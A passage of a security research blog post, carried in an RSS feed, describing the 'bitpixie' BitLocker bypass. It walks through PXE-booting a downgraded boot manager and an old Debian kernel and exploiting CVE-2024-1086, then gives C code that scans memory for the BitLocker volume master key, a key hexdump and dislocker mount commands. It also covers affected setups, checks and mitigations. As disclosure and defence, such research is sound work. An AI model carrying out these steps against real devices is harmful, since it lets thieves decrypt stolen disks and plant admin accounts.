<p>Another avenue I briefly persued was to enroll a Machine-Owner-Key (MOK). This is a feature provided by most Linux shims that let users sign their own kernels with their own keys.
To configure the MOK, I would have to boot into a <code>MoKManager</code> bootloader that would enroll the key. From my brief experiments, I could not get this to work from PXE.
Since this solution felt inelegant, leaving traces on the device, I abandoned it.</p>
<p><strong>To summarize:</strong> All Linux distros that are bootable with Microsoft-signed Secure Boot also enable lockdown mode on boot.
Lockdown is pretty solid, and known bypasses get patched.
None of the lockdown bypasses or raw memory reads I could find (e.g., broken drivers, ACPI tables, some random DMA things) worked anymore.
Kernel modules must be signed to be loaded, so that isn’t an option either.</p>
<p>What to do?
Easy!
<strong>Let’s exploit a Linux kernel in this Windows bootmanager exploit</strong> :D
Luckily, nowhere in the Linux boot chain does it say we have to boot up-to-date software (<em>cough</em> SBAT <em>cough</em>, more on that later!).
So we ran another “downgrade”, and looked for some old kernel with known vulnerabilities.</p>
<p>What Kernel should we pick?
We needed one that still boots on the latest shim/grub, which means signed after the distro last rotated their signing keys.
Also, we have to make sure to get the shim, the grub, and the kernel, all from the same distro.
Since Ubuntu somewhat recently rotated their Secure Boot keys (<a href="https://blog.jak-linux.org/2023/02/01/ubuntu-key-rotation/">Ubuntu 2022v1 Secure Boot key rotation and friends</a>), their old kernels will no longer boot, so I went with Debian.
They have great archives from which we can pick a suitable version.
I selected an up-to-date shim and grub, and used the arbitrarily selected kernel 5.14:</p>
<ul>
<li><a href="https://packages.debian.org/buster/shim-signed">Signed shim</a></li>
<li><a href="https://packages.debian.org/buster/grub-efi-amd64-signed">Signed grub</a></li>
<li><a href="https://snapshot.debian.org/package/linux-signed-amd64/5.14.6%2B2/#linux-image-5.14.0-1-amd64_5.14.6-2">Signed kernel</a></li>
</ul>
<p><strong>Next Problem: Booting old Kernel with modules</strong>:
Getting shim and grub to run is straightforward — just drop them into the TFTP folder.
Booting the kernel isn’t hard as well, but the initial filesystem, either <code>initrd</code> or <code>initramfs</code>, is a bit tricky.
Taking any random old initial filesystem works, but we run into issues with kernel modules, because the kernel is still in lockdown mode and enforces module signature checks.
Yay. We need matching initrd and kernel.</p>
<p>Finding a prebuilt old netboot kernel/initrd combination proved a dead end. There might be the perfect secure-bootable netboot out there, but I didn’t find it. This which left me with no choice but to build my own initrd based on the selected kernel and kernel-modules.
<em>Note</em>: If your exploit doesn’t require any external kernel modules, you might get away without this step, and can just use a random <code>initrd</code>.</p>
<p>The first tool I found was an Alpine-based initrd builder: <a href="https://github.com/lsiudut/alpine-initrd/tree/master">alpine-initrd</a>.
Alpine is not Debian, you say? No matter, I unpacked my botching tools and got to work!
The correct kernel modules, with matching versions and signatures, were already part of the Debian kernel <code>.deb</code> file I had downloaded earlier.
I modified the dockerfile to copy the correct kernel modules. To actually get them to load, <code>depmod -a</code> is your friend.
Could this process have been more elegant?
Absolutely.
But it was built incrementally without hindsight, and it <em>works surprisingly well</em>!
The Linux Kernel has a stable userspace ABI after all.</p>
<p>With the <code>initrd</code> in place, the last step was configuring grub to boot it.
This required creating a simple <code>grub.cfg</code> file in the <code>$TFTP/grub</code> folder, alongside the kernel and <code>initrd</code> in the TFTP root directory:</p>
<pre tabindex="0"><code><span><span>menu entry "Debian 5.14 with Alpine Initramfs" {</span></span>
<span><span> set gfxpayload=keep</span></span>
<span><span> linux   debian-kernel-514</span></span>
<span><span> initrd  alpine-initrd.xz</span></span>
<span><span>}</span></span></code></pre>
<h3 id="step-3b-exploiting-the-linux-kernel">Step 3b: Exploiting the Linux Kernel</h3>
<p>We have now successfully PXE-booted into Debian 5.14 on Secure Boot.
Now came another fun part: exploiting the kernel to read raw memory.
I used a vulnerability in Debian 5.14, <a href="https://nvd.nist.gov/vuln/detail/cve-2024-1086">CVE-2024-1086</a>.
Why this one?
Honestly, pretty random. A colleague suggested it because it has a public PoC by <a href="https://github.com/Notselwyn/CVE-2024-1086">Notselwyn</a>, and it worked well for this purpose.
Feel free to pick your favourite vulnerability.
The exploit I used takes advantage of a primitive that maps page tables into userspace, making raw memory scanning easy.
Because of this, I didn’t even bother disabling or bypassing lockdown mode, I could scan for the VMK straight from the exploit.</p>
<p>Scanning for the VMK in memory was straightforward thanks to a nice 8-byte magic header: <code>-FVE-FS-</code>.
This header is part of a data structure containing the VMK.
There are multiple structures with this header. To find the correct one, I used QEMU.
First, I used <code>dislocker</code> to dump the expected VMK (knowing the recovery key).
Then, I used QEMU to dump memory.
Finally, I compared the known-good VMK against the memory dump across multiple boots.</p>
<p>The structure was always really similar:
The structure always started with <code>-FVE-FS</code>.
The “version” field at offset 4 was always <code>1</code>.
The VMK’s exact offset within the struct varied depending on OS version, but I found that the 4 bytes immediately preceding the VMK were always the same: <code>03 20 01 00</code>.
Using this pattern, I built a reliable VMK scanner that works across all Windows 10 and 11 versions I tested:</p>
<pre tabindex="0"><code><span><span>// Haystack search for the needle. We have 'redirected' the pmd_data_area to point to physical memory with our PTE override above:</span></span>
<span><span>//printf("[+] haystack.\n");</span></span>
<span><span>void*</span><span> pmd_vmk_hdr_addr </span><span>=</span><span> memmem</span><span>(pmd_data_area, </span><span>0x</span><span>200000</span><span>, </span><span>"-FVE-FS-"</span><span>, </span><span>8</span><span>);</span></span>
<span><span>if</span><span> (pmd_vmk_hdr_addr </span><span>==</span><span> NULL</span><span>)</span></span>
<span><span>    continue</span><span>;</span></span>
<span></span>
<span><span>unsigned</span><span> long</span><span> long</span><span> phys_vmk_hdr_addr </span><span>=</span><span> phys_base </span><span>+</span><span> (pmd_vmk_hdr_addr </span><span>-</span><span> pmd_data_area);</span></span>
<span></span>
<span><span>// We have found a potential VMK! hexdump the area around it!</span></span>
<span><span>printf</span><span>(</span><span>"[+] found possible VMK base: </span><span>%p</span><span> -&gt; </span><span>%016llx\n</span><span>"</span><span>, pmd_vmk_hdr_addr, phys_vmk_hdr_addr);</span></span>
<span><span>hexDump</span><span>(</span><span>"VMK Candidate"</span><span>, pmd_vmk_hdr_addr, </span><span>0x</span><span>10</span><span>*</span><span>40</span><span>, </span><span>0x</span><span>10</span><span>);</span></span>
<span></span>
<span><span>uint32_t</span><span> version </span><span>=</span><span> *</span><span>(</span><span>uint32_t*</span><span>)(pmd_vmk_hdr_addr </span><span>+</span><span> 8</span><span>+</span><span>4</span><span>);</span><span> // version</span></span>
<span><span>uint32_t</span><span> start </span><span>=</span><span> *</span><span>(</span><span>uint32_t*</span><span>)(pmd_vmk_hdr_addr </span><span>+</span><span> 8</span><span>+</span><span>4</span><span>+</span><span>4</span><span>);</span><span> // start</span></span>
<span><span>uint32_t</span><span> end </span><span>=</span><span> *</span><span>(</span><span>uint32_t*</span><span>)(pmd_vmk_hdr_addr </span><span>+</span><span> 8</span><span>+</span><span>4</span><span>+</span><span>4</span><span>+</span><span>4</span><span>);</span><span> // end</span></span>
<span><span>if</span><span> (version </span><span>!=</span><span> 1</span><span>) {</span></span>
<span><span>    printf</span><span>(</span><span>"[+] VERSION MISMATCH! </span><span>%d\n</span><span>"</span><span>, version);</span></span>
<span><span>    continue</span><span>;</span></span>
<span><span>}</span></span>
<span><span>if</span><span> (end </span><span>&lt;=</span><span> start) {</span></span>
<span><span>    printf</span><span>(</span><span>"[+] NOT ENOUGH SIZE! </span><span>%x</span><span>, </span><span>%x\n</span><span>"</span><span>, start, end);</span></span>
<span><span>    continue</span><span>;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>// Now we found the correct VMK struct, look for more bytes that signal start of VMK</span></span>
<span><span>// No idea what they actually represent, just bindiffed win10/11 struct in memory and found them to be constant here.</span></span>
<span><span>void*</span><span> pmd_vmk_addr </span><span>=</span><span> memmem</span><span>(pmd_vmk_hdr_addr, end, </span><span>"</span><span>\x03\x20\x01\x00</span><span>"</span><span>, </span><span>4</span><span>);</span></span>
<span><span>if</span><span> (pmd_vmk_hdr_addr </span><span>==</span><span> NULL</span><span>) {</span></span>
<span><span>    printf</span><span>(</span><span>"[+] VMK-needle not found!</span><span>\n</span><span>"</span><span>);</span></span>
<span><span>    continue</span><span>;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>char*</span><span> vmk </span><span>=</span><span> pmd_vmk_addr </span><span>+</span><span> 4</span><span>;</span></span>
<span><span>printf</span><span>(</span><span>"[+] found VMK at: </span><span>%p</span><span> \n</span><span>"</span><span>, vmk);</span></span>
<span><span>/// [...]</span></span>
<span><span>fwrite</span><span>(vmk, </span><span>sizeof</span><span>(</span><span>char</span><span>), </span><span>32</span><span>, file);</span></span></code></pre>
<p>In practice, I never encountered a case where Linux overwrote the VMK in memory.
While I’m not certain this behavior is guaranteed, I’m not complaining! :)</p>
<p>Note that there are many other ways to achieve the same goal.
For example, we could have booted into a second Windows installation and loaded a vulnerable kernel driver there.
However, I was more familiar with Linux, so this method was the most practical for me.</p>
<p>Running the exploit, we get:</p>
<pre tabindex="0"><code><span><span>[...]</span></span>
<span><span>VMK Candidate:</span></span>
<span><span>  0000  2d 46 56 45 2d 46 53 2d 00 40 00 00 01 00 00 00  -FVE-FS-.@......</span></span>
<span><span>  0010  20 00 00 00 b0 00 00 00 00 00 00 00 00 00 00 00   ...............</span></span>
<span><span>  0020  90 00 00 00 01 00 00 00 30 00 00 00 90 00 00 00  ........0.......</span></span>
<span><span>  0030  61 e8 6f 18 a5 40 83 47 82 11 84 b4 85 8e 12 2f  a.o..@.G......./</span></span>
<span><span>  0040  13 00 00 00 04 80 00 00 76 46 2d 5c e0 b5 da 01  ........vF-\....</span></span>
<span><span>  0050  2c 00 05 00 01 00 01 00 03 20 01 00 4a 50 39 47  ,........ ..JP9G</span></span>
<span><span>  0060  d7 0d aa ea 23 44 d1 d4 fc aa 9c a4 e4 10 ae e7  ....#D..........</span></span>
<span><span>  0070  0a 5e a4 96 b3 68 82 72 b6 90 09 4a 08 00 04 00  .^...h.r...J....</span></span>
<span><span>  0080  07 00 01 00 2c 00 09 00 01 00 01 00 05 20 00 00  ....,........ ..</span></span>
<span><span>  0090  a7 b5 99 e7 bf 12 e1 81 0f ab f0 b0 f6 b8 8a 8c  ................</span></span>
<span><span>  00a0  a7 c7 b5 6a f8 b8 c3 6a 0b a4 7e 88 fd 6a 9f 8b  ...j...j..~..j..</span></span>
<span><span>  00b0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span>  00c0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span>  00d0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span>  00e0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span>  00f0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span></span></span>
<span><span>VMK = 4a 50 39 47 d7 0d aa ea 23 44 d1 d4 fc aa 9c a4 e4 10 ae e7 0a 5e a4 96 b3 68 82 72 b6 90 09 4a</span></span></code></pre>
<h3 id="step-4-mounting-the-bitlocker-paritition-with-vmk">Step 4: Mounting the BitLocker Paritition With VMK</h3>
<p>Finally, we’ve arrived!
With the VMK in hand, mounting the BitLocker partition should be straightforward, right?
Well, almost… Windows doesn’t expect you to have the decrypted VMK at hand, and there is no official tooling using it from CLI.</p>
<p>On Linux, there are (at least) two tools for mounting BitLocker disks: <code>dislocker</code> and <code>cryptsetup</code>.</p>
<p><code>dislocker</code> is great, as it directly accepts the VMK from CLI. It decrypts the BitLocker volume and provides access to its contents.
Unfortunately, it breaks when handling partitions created on Windows 11 24H2 right now: <a href="https://github.com/Aorimn/dislocker/issues/334">dislocker/issues/334</a>. This issue prevents the tool from parsing the disk and even attempting decryption.</p>
<p>The other tool, <code>cryptsetup</code> does not have this restriction, and works with 24H2 disks. But it has it’s own small caveat — it only accepts the FVEK, not the VMK from CLI.
But a minor patch to <code>cryptsetup</code> enables it to accept VMKs directly.</p>
<p>Here’s how you’d typically use dislocker given a VMK:</p>
<pre tabindex="0"><code><span><span>modprobe</span><span> fuse</span></span>
<span><span>mkdir</span><span> bitlocker</span></span>
<span><span>dislocker</span><span> -V</span><span> $PARTITION </span><span>-K</span><span> vmk.dat</span><span> -vvv</span><span> --</span><span> bitlocker</span></span>
<span><span>mkdir</span><span> mnt</span></span>
<span><span>mount</span><span> -t</span><span> ntfs-3g</span><span> -o</span><span> loop</span><span> bitlocker/dislocker-file</span><span> mnt</span></span></code></pre>
<p>We have full read and write access to the BitLocker partition. This means not only can we dump any stored secrets, we can for example also add a new admin-user. We can then boot the device without the exploit, and have full admin rights on the device.</p>
<h2 id="affected-devices">Affected Devices</h2>
<p>During my talk, I demonstrated this bug live on a Lenovo P14s Gen 2 laptop.
However, it is pretty much applicable to all devices using the default BitLocker “Device Encryption” setup, as this configuration relies solely on Secure Boot to automatically unseal the disk during boot.
Notably, Microsoft recently enabled exactly this default configuration on <em>all</em> Windows 11 24H2 devices that are signed into a Microsoft account.
This is great to see!
Bring disk encryption to everyone!
However, there’s still a long way to go before it’s actually secure by default.</p>
<p>To exploit bitpixie, an attacker needs:</p>
<ul>
<li>physical access to the device,</li>
<li>access to a keyboard and a network port (for network booting) or a USB port to connect an external LAN adapter,</li>
<li>network boot (PXEBoot) enabled or a way to enable it.</li>
</ul>
<p>If someone steals a device, this is easily fulfilled!
As far as I am concerned, this vulnerability affects <strong>all Secure Boot-protected BitLocker partitions on all versions of Windows</strong>, except for those having taken manual steps to mitigate this, or those running <em>exactly</em> July 2024 security update and no newer update (what a weird thing to say, right? Read on to find out why :p)</p>
<p>To check if your concrete setup is vulnerable, check what protectors your BitLocker partition has.
You can do this in Powershell with <code>manage-bde -protectors -get c:</code>.
This prints something along the lines of:</p>
<pre tabindex="0"><code><span><span>&gt; manage-bde -protectors -get c:</span></span>
<span><span></span></span>
<span><span>Volume C: []</span></span>
<span><span>All Key Protectors</span></span>
<span><span>[...]</span></span>
<span><span> TPM:</span></span>
<span><span> ID: {85825FF8-3733-48D0-B0EE-4D32D8AAFD7A}</span></span>
<span><span> PCR Validation Profile:</span></span>
<span><span> 7, 11</span></span>
<span><span> (Uses Secure Boot for integrity validation)</span></span></code></pre>
<p>Then, check the PCR Validation Profile.
If it shows <em>exactly</em> <code>7, 11</code> you are vulnerable.
If it includes a 4, you aren’t affected.</p>
<p>Optionally, check that you don’t have <a href="https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines">KB5025885</a> applied, which prevents this downgrade attack from working. Only systems using a bootloader signed with the 2011 Secure Boot certificate are vulnerable, which is the default.
To check this, mount your boot partition and check the signature of <code>S:\EFI\Microsoft\Boot\bootmgfw.efi</code>, as shown in Step 2d in <a href="https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines">KB5025885</a>.</p>
<h2 id="mitigation">Mitigation</h2>
<p>As you might expect, Microsoft is well aware of this vulnerability.
Unfortunately, there is no “easy and perfect” fix for this bug, which is why Microsoft hasn’t fixed this from their end.
They’ve attempted to rollout fixes before, most recently for <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38058">CVE-2024-38058</a>, which has a similar impact to the bug exploited here.
Unfortunately, their fix caused compatibility issues, forcing them to roll back the update within a month.</p>
<p>Downgrade protection in Secure Boot was really more of an afterthought, though that is slowly changing right now.
Here are your mitigation options, each with its own trade-offs.
Most aren’t available on Windows Home, which only gets the basic “Device Encryption” feature. Full BitLocker functionality requires a Pro/Enterprise license.</p>
<p>Worried about your own encryption, and this is all way too complicated?
As a first step, stop relying on automatic unsealing, and set a pre-boot password. That makes you an order of maginude more secure:</p>
<p><strong>Option 1: pre-boot authentication</strong>
In my opinion, this is the most secure “easy” solution available.
Enabling pre-boot authentication requires users to enter a password before the system boots.
In this mode, the TPM provides brute-force protection, and the attacker would have to either know the password or break the TPM.
However, this option introduces a minor inconvenience, as every user must authenticate at boot.</p>
<div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M13 9h-2V7h2m0 10h-2v-6h2m-1-9A10 10 0 0 0 2 12a10 10 0 0 0 10 10a10 10 0 0 0 10-10A10 10 0 0 0 12 2Z"></path></svg><p>If you have a discrete TPM (dTPM) on your motherboard, a secure pre-boot PIN is the only way to protect against <a href="https://www.youtube.com/watch?v=wTl4vEednkQ">hardware-based bus-sniffing attacks</a>, since TPM parameter encryption isn’t enabled yet for BitLocker keys.</p></div>
<p><strong>Option 2: adjust PCR configuration</strong>
This bug relies on a bootloader downgrade, and the fact that all secure-bootable Microsoft bootloaders can unlock the disk in the default configuration. Preventing bootloader downgrades, and always keeping it up-to-date thus protects you from known bootloader vulnerabilities.
You can do this by using a BitLocker PCR configuration of 0/2/4/11 instead of 7/11, sometimes called “legacy configuration”, since it doesn’t rely on Secure Boot.
However, there are two main trade-offs:
(1) This still leaves you vulnerable to unknown bootloader 0-days.
(2) You may experience more frequent BitLocker recovery screens (e.g., after UEFI or bootloader updates), where the automated disk unlocking fails.
This heavily depends on your exact setup but is one of the reasons Microsoft has changed its default to Secure Boot.</p>
<p><strong>Option 3: apply KB5025885</strong>
Microsoft’s official guidance now suggests users manually apply <a href="https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines">KB5025885</a>.
But be warned, this is fairly involved, as it adds new Secure Boot certificates, replaces your bootloader, and revokes old certificates.
While this is Microsoft’s planned long-term fix, it’s a complex process and isn’t fully rolled out yet.
For preventing this attack, steps 1 and 2 (using a bootloader signed by the 2023 certificate) are sufficient.
Blacklisting the 2011 certificate isn’t strictly necessary for this specific vulnerability:
The downgrade would still work, but the TPM would refuse to unseal the key, since the Secure Boot certificate differs.</p>
<p><strong>What doesn’t work</strong>:
Removing the PXE boot option from your UEFI isn’t enough.
Many UEFIs automatically add PXE-capable USB network cards, even if they weren’t previously enabled.
They have the lowest priority, but if we manually select this from the Windows recovery environment, this doesn’t matter.
Disabling the networking stack altogether could help, but attackers might still reset the UEFI to re-enable it, even if password protected.
Also, this isn’t the only attack vector for exploiting downgraded boot managers.
<a href="https://github.com/Wack0/bitlocker-attacks">Other techniques</a> can bypass these measures without relying on PXE.</p>
<p>Blocking the Microsoft 3rd-party Secure Boot certificate doesn’t help either. It would prevent Linux from booting, but that would only block the presented exploitation strategy, not the issue itself. It is also exploitable using any vulnerable Windows driver, of which there are enough. Note: This is default on Lenovo P14s Gen3 and newer as most Lenovo devices are now secured core PCs! See <a href="https://download.lenovo.com/pccbbs/mobiles_pdf/Enable_Secure_Boot_for_Linux_Secured-core_PCs.pdf">Lenovo Secured-core
PC’s</a>.</p>
<div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M13 9h-2V7h2m0 10h-2v-6h2m-1-9A10 10 0 0 0 2 12a10 10 0 0 0 10 10a10 10 0 0 0 10-10A10 10 0 0 0 12 2Z"></path></svg><p>You can find more information about the security trade-offs in the Microsoft documentation on <a href="https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/countermeasures">BitLocker countermeasures</a>. While I disagree with their claim that the default Secure Boot-based TPM config is sufficient against attacks <em>“without much skill or with limited physical access”</em>, their recommendations are otherwise comprehensive and worth exploring. They go a lot deeper than the basic mitigations presented here.</p></div>
<h2 id="conclusion">Conclusion</h2>
<p>Phew, this was quite involved for such a “simple” idea.
But in the end, we get full read/write access to a BitLocker encrypted disk on the default “Device Encryption” BitLocker setup, without any changes to the target system!</p>
<p>The necessary downgrade of the bootloader is fairly easy to perform, but Secure Boot made the exploit more involved than expected, even though it was bypassable at every step.
To summarize:</p>
<ol>
<li>We got an old Windows bootmanager that was vulnerable to the pxesoftreboot bug</li>
<li>We copied the BCD from the target device</li>
<li>We modified the BCD to have a pxesoftreboot recovery option</li>
<li>We pointed that recovery option to a Debian shim</li>
<li>We triggered a PXE boot on the target device into our downgraded Windows boot manager. This unsealed the VMK, the boot failed and caused a fallback to our pxesoftreboot, which booted Debian shim, which in return booted a Debian grub</li>
<li>We set grub to boot an old Debian 5.14 kernel with an Alpine <code>initrd</code></li>
<li>We exploited the kernel with a known bug to read raw memory</li>
<li>We extracted the VMK</li>
<li>We used dislocker to mount the partition</li>
<li>We can read/write the decrypted Windows partition</li>
</ol>
<p>So is BitLocker Device Encryption a bad idea? Certainly not. Default hard-drive encryption for home users is a big step forward — any protection is better than none, and it makes “wiping” drives during factory resets straightforward. And once Microsoft rolls out a persistent fix to the downgrade issue, this new default setup will be a lot more secure. There will likely still be attacks against TPM-only setups, but more difficult ones.
But <em>right now</em>, without those patches rolled out, it can give a false sense of security.</p>
<p>There’s no widely available exploit tool for this method, and we certainly won’t be publishing one.
That said, it seems reasonable to assume that well-resourced parties already have access to such exploits.</p>
<p><strong>Why is this still possible?</strong>
Can’t we patch the downgrades somehow?
Since this post is already quite extensive, I split it up into a companion post: <a href="https://neodyme.io/en/blog/bitlocker_why_no_fix">On Secure Boot, TPMs, SBAT and Downgrades — Why Microsoft hasn’t fixed BitLocker yet</a>.
If your are at all interested in secure/verified boot, how this exactly combined to create automated unlocks, and why Linux users have been prompted with obscure SBAT errors in the past couple months, I recommend you check it out! It also contains a section on ‘Other attacks against BitLocker’, that shows just how many different vectors there are against TPM-only unlocks.</p>
<p>Please use this research responsibly!
Should you have any questions, please reach out to thomas (at) neodyme.io, maybe I can help :)</p>
<h2 id="38c3-talk---windows-bitlocker--screwed-without-a-screwdriver">38C3 Talk - Windows BitLocker — Screwed without a Screwdriver</h2>
<p>I presented this research at <a href="https://events.ccc.de/congress/2024/infos/index.html">38C3</a>.
You can find the presentation here: <a href="https://media.ccc.de/v/38c3-windows-bitlocker-screwed-without-a-screwdriver">https://media.ccc.de/v/38c3-windows-bitlocker-screwed-without-a-screwdriver</a></p>
<gdpr-embed content="https://media.ccc.de/v/38c3-windows-bitlocker-screwed-without-a-screwdriver/oembed" props="allowfullscreen frameborder=0"><div><p>By revealing the content you are aware that third-parties may collect personal information</p></div></gdpr-embed>
<h2 id="some-notes-on-debugging-with-qemu">Some Notes on Debugging with QEMU</h2>
<p>I tested all of this in QEMU before running it on real hardware.
This was great, since I could dump memory whenever I wanted. But the initial setup was annoying.
Here’s what worked for me:</p>
<ul>
<li>Use QEMU with <code>libvirt/virt-manager</code></li>
<li>Windows 11 24H2 as the guest OS:
<ul>
<li>This version greatly simplifies BitLocker activation, automatically enabling it as long as Secure Noot is on and the user is logged into a Microsoft account.</li>
</ul>
</li>
<li>Configure QEMU for Secure Boot:
<ul>
<li>The default OVMF variables (EFI configuration) do not include any certificates, so you need to manually enroll Microsoft’s Secure Boot certificates: <code>ovmfctl --input /usr/share/edk2-ovmf/x64/OVMF_VARS.4m.fd --secure-boot --distro-keys windows --output file.fd</code></li>
<li>Enable TPM 2.0</li>
</ul>
</li>
<li>Set up PXE boot:
<ul>
<li>edit a bridge network to include the <code>tftp</code> and <code>bootp</code> options in the XML configuration.</li>
</ul>
</li>
<li>Dump memory with <code>virsh</code>:
<ul>
<li>Use <code>sudo virsh dump --memory-only win-test /tmp/mem.dmp</code>.</li>
<li>Analyse the dump with tools like <a href="https://github.com/breppo/Volatility-BitLocker">Volatility-Bitlocker</a> to extract the FVEK (careful: not the VMK!)</li>
</ul>
</li>
</ul>
<p>You can get the VMK by entering the recovery-password in <code>dislocker</code> with verbose output, which then prints the VMK to the console.
Then, you can search the memory dump for the known VMK.</p>
<pre tabindex="0"><code><span><span>sudo qemu-nbd --connect=/dev/nbd2 win.qcow2</span></span>
<span><span>sudo dislocker -vvvv -V /dev/nbd0p3 -p</span></span></code></pre>
<p>A final note: specifying the FVEK directly in <code>dislocker</code> can be tricky, as outlined in <a href="https://github.com/Aorimn/dislocker/issues/202">dislocker/issues/202</a>.</p> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The AMD Radeon Instinct MI300A's Giant Memory Subsystem (196 pts)]]></title>
            <link>https://chipsandcheese.com/p/inside-the-amd-radeon-instinct-mi300as</link>
            <guid>42747864</guid>
            <pubDate>Sat, 18 Jan 2025 12:28:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chipsandcheese.com/p/inside-the-amd-radeon-instinct-mi300as">https://chipsandcheese.com/p/inside-the-amd-radeon-instinct-mi300as</a>, See on <a href="https://news.ycombinator.com/item?id=42747864">Hacker News</a></p>
Couldn't get https://chipsandcheese.com/p/inside-the-amd-radeon-instinct-mi300as: Error: timeout of 10000ms exceeded]]></description>
        </item>
    </channel>
</rss>